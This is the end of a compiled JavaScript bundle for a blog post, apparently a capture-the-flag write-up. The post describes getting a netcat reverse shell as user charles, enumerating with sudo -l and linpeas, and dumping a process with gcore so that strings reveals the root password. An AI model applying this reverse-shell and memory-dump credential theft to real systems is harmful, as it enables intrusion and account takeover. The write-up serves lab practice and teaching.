url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAACJElEQVR42o1TyY7TUBD0ZyCxJXEWZ3Mc25PV8W7HSZyFyUgjwQENHGAk4MSRG1y4gsQBIfGpRfVLAHFAcCi1q1+/6uW1te32CtNJhIWXIfCXvxAFBYJFjoB+/6ePPDwjDVdIGbOYxpiPQwVnMIWW5nvkq0fIC8EBieKXyJd7JGmJLN8pXtBfkpfZFhvaLf3+KIDddWE2LViGDbNlQfN8ZuNhwsCCF8VG8QZxUiJOtwrKR5E42yNjoohnPisMorU6D+K18k3nCTQ/LJBmJ0GBEiKiZHPiWamsJBVRiZXzkCIhEytOUelkNk+hLTgbIYJURHlJ2s1yafkUKHzJschZzERSpQjG5EsZk9yhVYLhuVw/WsFyPNjuAvaFr+yQcMcRHHL5tuy58gt3ZX60zhlDZ4Fef0zBaK2yjfla9ysdVOsmKnofD2u9/0O1q1Dht0ALotMsxrNECdVbQ+h8Nb0x+Cdqypqo1X9DkxeVlifsv6Kb0ClYpaACL1T+BhE4J/5DcMLKAq7AiIt5524Tut5Dh1kbbN9gQIe71ax1YbD6DnmLtkm0KSSt3nvQRpVcoATX5RXMwQSO7cHjLPeuh4+DEb4XW3zKS3wY+/i6LPHZT/G+1ceXYodvuyPeMeaCjyTr1e64aHPBdRF89fotWm0HpjXDzfNbzPmr9XojvHj5BgmDDWOI6+unWK0OjLNxdXyC4+VjijhcpwNunt3C4PeQG9JoDfEDdsuVVnARGnkAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="output-process"\n        title=""\n        src="/static/968bc8608f607821bc64c7cf68e51eb0/7d769/output-process.png"\n        srcset="/static/968bc8608f607821bc64c7cf68e51eb0/5243c/output-process.png 240w,\n/static/968bc8608f607821bc64c7cf68e51eb0/ab158/output-process.png 480w,\n/static/968bc8608f607821bc64c7cf68e51eb0/7d769/output-process.png 960w,\n/static/968bc8608f607821bc64c7cf68e51eb0/9d0b4/output-process.png 1328w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.p,null,"However, we can try to extract printable character sequences from binary files using the ",a.createElement(t.code,null,"strings")," command"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"looking through the output of the strings command shows the password for the root user"),"\n"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"strings <outputfile>\n")),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 522px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 73.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABYlAAAWJQFJUiTwAAACX0lEQVR42o1UyXKbUBDUl9hCQhsYJIzQgthXgUBb2XKcVMUHV+WQ/793+uHISyJXcuiaqbc0PW96aC3sGPp4Camr4UpS0WYU+bXIOze4aqtN3pF1dHqfQH5Da7lKMLU86JMlFsz1iY2J6cKc+dC4JqIx9dAb3vLy+J9ozZcRsvUetpNgXR7hhwWipEK9e0AQbbA/PDbrijaD1Ki8QHRWKAhNqrNmHkyqEOTWPGgwW4QQe2eM1Cm6vCD3J+gR8iveCLuNQl6Mkg1JA+RU4ng51abIin0T03yHKK3RH5mfK3xfskVC18swmzMGBWZU6QZrhHEF0bCEhOIjAyoUDRMq2oT0GeH9ysVx5WG/WOHO9bFfrrBjfnS8JgocbBepbiBUNPgjDYlyg8Hv7nb/QOvH/QOybAtDs7Cvjoj9DHWxwybfNrmmmAi9FEVWI3JTSLRSSkK9r1HxBcIiyLAISngs0Y9rrFh2vD7AsHz4SQ2LVrK55qdbzPmm2jyCPVCh9XVcyx892PjwZ1niuarxXFb4Fqc4eQGe8gLFxOQz2DjaDk58iscgRj42sL6dolJUjFhy+xJhEpdYpxWcZYicsd99eZ8hIXdUyJKCLtHjel/mnqyhx4tS92+yhlBMgh+VmDJmxQErdtRhidXuC7ywxFYYe3OHIN7A8XOe3bx2vt3RSDL+gJawx+nhOzweni4CTkpJX9a4pZmFDYaqhQE9KA+MZvwEBmxUb2hcto34Ur07IaRKYWzhQQHhR+Vm9vKzeGdokZ9xeZZtzjJLKEi2P359GT+aPWf5JkdSEP7PT+FM+AtPKuJG7tuTIQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="root-pass"\n        title=""\n        src="/static/842f7283616652f476c09983d2809562/03dc1/root-pass.png"\n        srcset="/static/842f7283616652f476c09983d2809562/5243c/root-pass.png 240w,\n/static/842f7283616652f476c09983d2809562/ab158/root-pass.png 480w,\n/static/842f7283616652f476c09983d2809562/03dc1/root-pass.png 522w"\n        sizes="(max-width: 522px) 100vw, 522px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.p,null,"Use this password and switch to the root user\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 658px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 39.583333333333336%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABYlAAAWJQFJUiTwAAABsElEQVR42j1S227iQAzNl6CyBAqEXMgkQ26TSULuCTRFQLsrrfb/v+LUmVb7cGSPbdnn2KM5TCASDVwuweMScdaBBQW8H1iUT4sBQVLDdGMYdkh+BfMYY7Gy8KLb31jbWBK0PK3RlwOaosM03tBXA1yLI2AR/GMA22AQgUToJfCdAIxykZ/ANX3s1xYOr7aCQdB1C9otkbhXHf693fBsBvSRRMUjZI6Pyo9wETmE5aFgAbz1Hv7mAHe1BdN3yucbAx4hnLE1oTWhQJL3aLt3ZCRNyBaCZJ+iM/LziG6400pqSMrtzRNMJ8LRT+H+gPEMjidw4imEQZInYvgsW/xpejyKGp9Vi5GGTGmOz7rDb4q/y4JqGnSnWMU+qP4SpVSXqtoxlriGCYIdNWR0jIwYXa9PlOWImJjV5QWMpobhGVV9VT4/ZQrFeVBvnQ6wWOzwsjT+Y0lH0maJ3XBD3U6om4kkNyR1QDhfXFTwqclsJa1lGB/gQUZ+p/L7A4f+6uAXHWNFA2arzYmMiqPk20pie2SJajT798df9Z7ZJbTLOc6DHA59IeZLbLYuMTNVs7nhF/hADSHnSMF6AAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="proof"\n        title=""\n        src="/static/5d6989c2dca2fa6b78aa759569e09516/0248a/proof.png"\n        srcset="/static/5d6989c2dca2fa6b78aa759569e09516/5243c/proof.png 240w,\n/static/5d6989c2dca2fa6b78aa759569e09516/ab158/proof.png 480w,\n/static/5d6989c2dca2fa6b78aa759569e09516/0248a/proof.png 658w"\n        sizes="(max-width: 658px) 100vw, 658px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.h1,null,"Summary"),"\n",a.createElement(t.p,null,"By using a netcat command to spawn a bash reverse shell, we were able to gain a foothold as the user charles. Then, we looked at the commands available to the user with ",a.createElement(t.code,null,"sudo -l")," and further enhanced our process enumeration with linpeas. Dumping the contents of the process with gcore and running strings on the dump file of the suspicious process, we were able to grab the root user password."),"\n",a.createElement(t.p,null,"Join me for the next machine soon for more exciting challenges and security insights!"),"\n",a.createElement(t.p,null,"+20 points"))}var s=function(e){void 0===e&&(e={});const{wrapper:t}=Object.assign({},(0,l.ah)(),e.components);return t?a.createElement(t,e,a.createElement(i,e)):i(e)},c=n(4765);function o(e){return a.createElement(c.Z,e,a.createElement(s,e))}c.Z}}]);
//# sourceMappingURL=component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx-content-file-path-content-posts-pelican-index-mdx-de6125a1d9f272ca60eb.js.map